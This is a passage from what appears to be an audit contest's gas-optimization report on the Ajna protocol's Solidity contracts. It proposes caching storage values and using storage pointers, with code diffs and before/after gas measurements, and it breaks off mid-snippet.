Savings for <code>GrantFund.updateSlate</code>, obtained via protocol’s tests: Avg 2387 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>318329</td>\n</tr>\n<tr>\n<td>After</td>\n<td>315942</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate_</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">435</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..115edd4 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -432,7 +432,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // check each proposal in the slate is valid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint i = 0; i &lt; numProposalsInSlate_; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Proposal storage proposal = _standardFundingProposals[proposalIds_[i]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check if Proposal is in the topTenProposals list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L763-L766\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L763-L766</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 2372 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>406973</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">763</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">764:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">765:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">array_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">766</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..ea0c1cd 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -762,8 +762,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _findProposalIndex(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint256[] memory array_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) internal pure returns (int256 index_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256[] storage array_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) internal view returns (int256 index_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         index_ = -1; // default value indicating proposalId not in the array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         int256 arrayLength = int256(array_.length);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L789-L792\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L789-L792</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 3307 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>406038</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">789</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_findProposalIndexOfVotesCast</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">790:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">791:        </span><span class=\"mtk10\">FundingVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">792</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..64d1163 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -788,8 +788,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _findProposalIndexOfVotesCast(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 proposalId_,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        FundingVoteParams[] memory voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) internal pure returns (int256 index_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        FundingVoteParams[] storage voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) internal view returns (int256 index_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         index_ = -1; // default value indicating proposalId not in the array</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L843-L845\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L843-L845</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 4282 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>405063</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">843</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_sumSquareOfVotesCast</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">844:        </span><span class=\"mtk10\">FundingVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">votesCast_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">845</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCastSumSquared_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..b79bec9 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -841,8 +841,8 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      * @return votesCastSumSquared_ The sum of the square of each vote cast.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function _sumSquareOfVotesCast(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        FundingVoteParams[] memory votesCast_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) internal pure returns (uint256 votesCastSumSquared_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        FundingVoteParams[] storage votesCast_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) internal view returns (uint256 votesCastSumSquared_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numVotesCast = votesCast_.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; numVotesCast; ) {</span></span></span></code></pre>\n<h2 id=\"g-05-avoid-emitting-storage-values\" style=\"position:relative;\"><a href=\"#g-05-avoid-emitting-storage-values\" aria-label=\"g 05 avoid emitting storage values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Avoid emitting storage values</h2>\n<p>Caching of a state variable replaces each <code>Gwarmaccess (100 gas)</code> with a much cheaper stack read. We can avoid unecessary SLOADs by caching storage values that were previously accessed and emitting those cached values.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L58-L64\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/GrantFund.sol#L58-L64</a></p>\n<h3 id=\"cache-expression-and-emit-cached-value-instead-of-reading-from-storage\" style=\"position:relative;\"><a href=\"#cache-expression-and-emit-cached-value-instead-of-reading-from-storage\" aria-label=\"cache expression and emit cached value instead of reading from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache expression and emit cached value instead of reading from storage</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GrantFund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">fundTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingAmount_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ajnaTokenAddress</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// update treasury accounting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">fundingAmount_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FundTreasury</span><span class=\"mtk1\">(</span><span class=\"mtk12\">fundingAmount_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit: emit expression</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/GrantFund.sol b/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 3d568b0..fb9f369 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/GrantFund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -59,12 +59,14 @@ contract GrantFund is IGrantFund, ExtraordinaryFunding, StandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         IERC20 token = IERC20(ajnaTokenAddress);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // update treasury accounting</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        treasury += fundingAmount_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 _newTreasury = treasury + fundingAmount_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        treasury = _newTreasury;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        emit FundTreasury(fundingAmount_, treasury);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        emit FundTreasury(fundingAmount_, _newTreasury);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // transfer ajna tokens to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         token.safeTransferFrom(msg.sender, address(this), fundingAmount_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span></code></pre>\n<h2 id=\"g-06-multiple-accesses-of-a-mappingarray-should-use-a-storage-pointer\" style=\"position:relative;\"><a href=\"#g-06-multiple-accesses-of-a-mappingarray-should-use-a-storage-pointer\" aria-label=\"g 06 multiple accesses of a mappingarray should use a storage pointer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Multiple accesses of a mapping/array should use a storage pointer</h2>\n<p>Caching a mapping’s value in a storage pointer when the value is accessed multiple times saves ~40 gas per access due to not having to perform the same offset calculation every time. Help the Optimizer by saving a storage variable’s reference instead of repeatedly fetching it.</p>\n<p>To achieve this, declare a storage pointer for the variable and use it instead of repeatedly fetching the reference in a map or an array. As an example, instead of repeatedly calling <code>stakes[tokenId_]</code>, save its reference via a storage pointer: <code>StakeInfo storage stakeInfo = stakes[tokenId_]</code> and use the pointer instead.</p>\n<p><strong>Note: These are instances the automated report missed</strong></p>\n<p>Total Instances: <code>14</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L389-L412\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L389-L412</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: Avg 290 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>392774</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"cache-storage-pointers-for-stakestokenid_-and-isepochclaimedtokenid_\" style=\"position:relative;\"><a href=\"#cache-storage-pointers-for-stakestokenid_-and-isepochclaimedtokenid_\" aria-label=\"cache storage pointers for stakestokenid_ and isepochclaimedtokenid_ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache storage pointers for <code>stakes[tokenId_]</code> and <code>isEpochClaimed[tokenId_]</code></h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ajnaPool</span><span class=\"mtk1\">         = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">ajnaPool</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastClaimedEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stakes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lastClaimedEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span 